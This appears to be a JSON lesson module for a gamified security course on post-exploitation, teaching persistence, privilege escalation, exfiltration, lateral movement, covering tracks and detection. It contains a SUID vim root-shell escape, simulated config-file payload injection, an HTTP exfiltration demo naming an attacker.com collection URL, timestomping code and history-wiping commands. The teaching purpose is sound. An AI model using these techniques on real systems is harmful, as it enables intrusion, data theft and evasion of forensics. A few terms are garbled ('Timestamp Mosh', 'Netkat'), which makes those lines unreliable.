{
    "id": "post_exploitation",
    "topicId": "post_exploit_basics",
    "topicTitle": "Post-Exploitation",
    "description": "What happens after the shell? Learn techniques for maintaining access, escalating privileges, and moving laterally.",
    "baseKP": 100,
    "slides": [
        {
            "id": "post_exp_1",
            "type": "content",
            "title": "Introduction to Post-Exploitation",
            "content": "# Post-Exploitation üö©\n\nGetting a shell is just the beginning. **Post-exploitation** refers to the actions taken after compromising a system to maintain access and achieve the attack's objectives.\n\n## The Phase Goals\n1.  **Persistence:** ensuring you can get back in.\n2.  **Privilege Escalation:** Getting `root` or `Administrator` access.\n3.  **Looting:** Finding passwords, keys, and sensitive data.\n4.  **Lateral Movement:** Jumping to other machines on the network.\n5.  **Covering Tracks:** Hiding evidence of your presence."
        },
        {
            "id": "post_exp_2",
            "type": "content",
            "title": "Persistence Mechanisms",
            "content": "# Persistence üï∑Ô∏è\n\nPersistence ensures your access survives reboots or user logouts.\n\n## Linux Techniques\n- **Cron Jobs:** Schedule a reverse shell to run every minute.\n- **SSH Keys:** Add your public key to `~/.ssh/authorized_keys`.\n- **Service Creation:** Create a systemd service.\n- **Bashrc:** Add malicious alias/command to `~/.bashrc`.\n\n## Windows Techniques\n- **Registry Run Keys:** Keys like `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` auto-execute programs on login.\n- **Scheduled Tasks:** `schtasks` command.\n- **Startup Folder:** Placing executable in the User's startup directory."
        },
        {
            "id": "post_exp_3",
            "type": "content",
            "title": "Persistence Code Example",
            "content": "# Creating Persistence (Simulation) ü•∏\n\nA Python script simulating adding a \"malicious\" entry to a startup-like file.\n\n<!-- FULL_CODE_START\nimport os\n\ndef simulate_persistence():\n    # Simulate a user config file\n    config_file = \"user_config.sh\"\n    \n    # Create dummy config\n    with open(config_file, \"w\") as f:\n        f.write(\"# User Configuration\\nexport PATH=$PATH:/bin\")\n        \n    print(\"Original Config Content:\")\n    print(open(config_file).read())\n    \n    # Attack: Append malicious payload\n    payload = \"\\n# Malicious Payload\\n/bin/bash -c 'echo I am watching you > /tmp/hacked.txt' &\"\n    \n    print(\"--- Injecting Persistence ---\")\n    with open(config_file, \"a\") as f:\n        f.write(payload)\n        \n    print(\"New Config Content:\")\n    print(open(config_file).read())\n    \n    # Cleanup\n    os.remove(config_file)\n\nsimulate_persistence()\nFULL_CODE_END -->"
        },
        {
            "id": "post_exp_4",
            "type": "content",
            "title": "Privilege Escalation Overview",
            "content": "# Privilege Escalation ‚¨ÜÔ∏è\n\nMoving from a low-privileged user (e.g., `www-data`) to `root` or `SYSTEM`.\n\n## Horizontal vs Vertical\n- **Horizontal:** accessing another user's account with similar privileges (e.g., Bob -> Alice).\n- **Vertical:** Accessing an account with higher privileges (e.g., User -> Admin).\n\n## Common Vector Sources\n- **Kernel Exploits:** DirtyCOW, etc.\n- **Misconfigurations:** Writable SUID binaries, Unquoted Service Paths.\n- **Stored Credentials:** Cleartext passwords in config files or history.\n- **Weak Permissions:** Being able to write to `/etc/passwd`."
        },
        {
            "id": "post_exp_5",
            "type": "content",
            "title": "Linux PrivEsc: SUID",
            "content": "# SUID Binaries üÜî\n\n**SUID (Set User ID)** files run with the permissions of the file owner (usually root), not the user running them.\n\nIf a SUID binary has a vulnerability or allows shell escape (like `find`, `vim`, `nmap`), it can be used to get a root shell.\n\n## Example\nIf `vim` is SUID root:\n`vim -c ':!/bin/sh'`\nThis opens vim, then immediately executes `/bin/sh` as root!"
        },
        {
            "id": "post_exp_quiz_1",
            "type": "quiz",
            "title": "PrivEsc Check",
            "content": "Test your PrivEsc knowledge.",
            "quizQuestion": "Which of the following file permissions would be most dangerous on the '/etc/shadow' file?",
            "quizOptions": [
                "Read-only for root",
                "World-readable",
                "World-writable",
                "No access"
            ],
            "correctOptionIndex": 2
        },
        {
            "id": "post_exp_6",
            "type": "content",
            "title": "Data Exfiltration",
            "content": "# Data Exfiltration üì§\n\nTransferring stolen data out of the target network without detection.\n\n## Techniques\n- **Standard Protocols:** HTTP/HTTPS uploads, FTP, SCP.\n- **DNS Tunneling:** Encoding data in DNS queries (e.g., `hexdata.attacker.com`). Harder to detect as DNS is rarely blocked.\n- **ICMP Tunneling:** Hiding data in Ping packets.\n- **Steganography:** Hiding data inside images.\n\n## Detection\nDefenders look for large outbound spikes, long connections, or anomalous protocol usage."
        },
        {
            "id": "post_exp_7",
            "type": "content",
            "title": "Simple Exfiltration Demo",
            "content": "# Exfiltration with HTTP üì¶\n\nSimulating sending data to a remote server.\n\n<!-- FULL_CODE_START\nimport urllib.request\nimport urllib.parse\nimport base64\n\ndef exfiltrate_data(data):\n    # 1. Encode data to handle binary/special chars\n    encoded = base64.b64encode(data.encode()).decode()\n    print(f\"Encoded Data: {encoded}\")\n    \n    # 2. Construct URL (Simulated attacker server)\n    # In real world: http://attacker.com/collect?d=...\n    url = f\"http://example.com/api?data={encoded}\"\n    \n    print(f\"Exfilling to: {url}\")\n    \n    # 3. Send Request (we won't actually send to avoid network errs on runner)\n    # urllib.request.urlopen(url)\n    print(\"Request Sent! (Simulated)\")\n\nsecret = \"CONFIDENTIAL_DB_PASSWORD_123\"\nprint(f\"Stolen Secret: {secret}\")\nexfiltrate_data(secret)\nFULL_CODE_END -->"
        },
        {
            "id": "post_exp_8",
            "type": "content",
            "title": "Lateral Movement",
            "content": "# Lateral Movement ü¶Ä\n\nSpreading from the initial foothold to other machines in the network to find the \"Jewels\".\n\n## Techniques\n- **Pass the Hash (PtH):** Authenticating to other Windows machines using the NTLM hash of a password, without needing the plaintext password.\n- **SSH Hijacking:** Using existing SSH sockets (`ssh-agent`) of logged-in users to hop to other servers.\n- **Token Impersonation:** Stealing Windows access tokens from running processes to masquerade as domain admins."
        },
        {
            "id": "post_exp_9",
            "type": "content",
            "title": "Pivoting",
            "content": "# Pivoting üìç\n\n**Pivoting** is using a compromised host as a proxy to attack other systems in an internal network that are not directly reachable.\n\n## Example\n1. Attacker is on Public Internet.\n2. Attacker compromises Web Server (Publicly accessible).\n3. Web Server has a second interface on the Internal DB Network.\n4. Attacker routes traffic *through* the Web Server to attack the Database Server.\n\nTools: `ssh -D` (SOCKS proxy), Chisel, Ligolo."
        },
        {
            "id": "post_exp_10",
            "type": "content",
            "title": "Covering Tracks",
            "content": "# Covering Tracks üßπ\n\nRemoving evidence to avoid detection and forensic analysis.\n\n## Actions\n- **Log Cleaning:** Deleting or modifying logs (`/var/log/auth.log`, `Windows Event Tags`).\n- **Timestamp Mosh (Timestomping):** Changing file modification times to match system files so malware isn't obvious.\n- **History Deletion:** `history -c`, deleting `.bash_history`.\n- **File Deletion:** securely overwriting files (`shred`) instead of just unlinking them."
        },
        {
            "id": "post_exp_11",
            "type": "content",
            "title": "Timestomping Example",
            "content": "# Timestomping Logic üïí\n\nChanging file attributes to blend in.\n\n<!-- FULL_CODE_START\nimport os\nimport time\n\nfilename = \"malware.exe\"\nwith open(filename, \"w\") as f:\n    f.write(\"evil content\")\n\n# Get current stats\nst = os.stat(filename)\nprint(f\"Original Modify Time: {time.ctime(st.st_mtime)}\")\n\n# Change time to a past date (e.g., 2020-01-01)\n# This helps hide from 'recently modified' searches\npast_time = 1577836800\nos.utime(filename, (past_time, past_time))\n\nst_new = os.stat(filename)\nprint(f\"New Modify Time:      {time.ctime(st_new.st_mtime)}\")\n\n# Cleanup\nos.remove(filename)\nFULL_CODE_END -->"
        },
        {
            "id": "post_exp_quiz_2",
            "type": "quiz",
            "title": "Pivoting check",
            "content": "Understand network traversal.",
            "quizQuestion": "What is the primary purpose of 'Pivoting' in a penetration test?",
            "quizOptions": [
                "To crack passwords faster",
                "To route traffic through a compromised host to access internal networks",
                "To delete logs",
                "To encrypt the hard drive"
            ],
            "correctOptionIndex": 1
        },
        {
            "id": "post_exp_12",
            "type": "content",
            "title": "Mimikatz & Credential Dumping",
            "content": "# Credential Dumping üîë\n\nOn Windows, adversaries often target `LSASS.exe` (Local Security Authority Subsystem Service) to dump memory credentials.\n\n## Mimikatz\nThe most famous tool for this. It can:\n- Extract plaintext passwords (if WDigest is enabled).\n- Extract Kerberos tickets.\n- Perform Pass-the-Hash.\n\nDefenders detect this by monitoring access to the LSASS process memory."
        },
        {
            "id": "post_exp_13",
            "type": "content",
            "title": "Living off the Land (LotL)",
            "content": "# Living off the Land üåø\n\nUsing legitimate, pre-installed system tools to conduct attacks. This avoids bringing custom malware that might be flagged by Antivirus.\n\n## Binaries (LOLBins)\n- **Certutil:** Can download files on Windows.\n- **Powershell:** Heavy usage for administration (and attacks).\n- **WMI:** Windows Management Instrumentation for lateral movement.\n- **Netkat (nc):** often installed on Linux servers for debugging."
        },
        {
            "id": "post_exp_14",
            "type": "content",
            "title": "Empire & C2 Frameworks",
            "content": "# C2 Frameworks üéÆ\n\nA **Command and Control (C2)** server manages the compromised hosts (agents).\n\n## Popular Frameworks\n- **Metasploit / Meterpreter:** The classic.\n- **Cobalt Strike:** The industry standard for Red Teams (and advanced criminals).\n- **Sliver / Empire:** Open source alternatives.\n\nThese frameworks automate persistence, pivoting, and looting."
        },
        {
            "id": "post_exp_15",
            "type": "content",
            "title": "Defense: Logging & Monitoring",
            "content": "# Detecting Post-Exploitation üïµÔ∏è‚Äç‚ôÄÔ∏è\n\nDetection is often easier here than at the initial exploit.\n\n- **SIEM:** Correlate logs to find anomalies (e.g., user logging in from 2 places at once).\n- **EDR:** Endpoint Detection and Response tools monitor process behavior (e.g., Word spawning PowerShell).\n- **File Integrity Monitoring (FIM):** Alerts when critical system files are modified.\n- **User Behavior Analytics (UBA):** Detects odd working hours or massive data access."
        },
        {
            "id": "post_exp_16",
            "type": "content",
            "title": "Summary",
            "content": "# Post-Exploitation Summary üèÅ\n\nYou've learned how attackers turn a single breach into a full network compromise.\n\n## Recap\n- **Persistence** keeps you in.\n- **PrivEsc** gets you power.\n- **Lateral Movement** finds the valuable data.\n- **Exfiltration** gets data out.\n- **Covering Tracks** delays discovery.\n\nDefenders must assume breach and focus on detecting these activities quickly!"
        },
        {
            "id": "post_exp_17",
            "type": "content",
            "title": "Final Quiz",
            "content": "Let's wrap up.",
            "quizQuestion": "Which technique allows an attacker to authenticate using a hashed password instead of the plaintext password?",
            "quizOptions": [
                "Brute Force",
                "Credential Stuffing",
                "Pass the Hash",
                "Hash Crash"
            ],
            "correctOptionIndex": 2
        }
    ]
}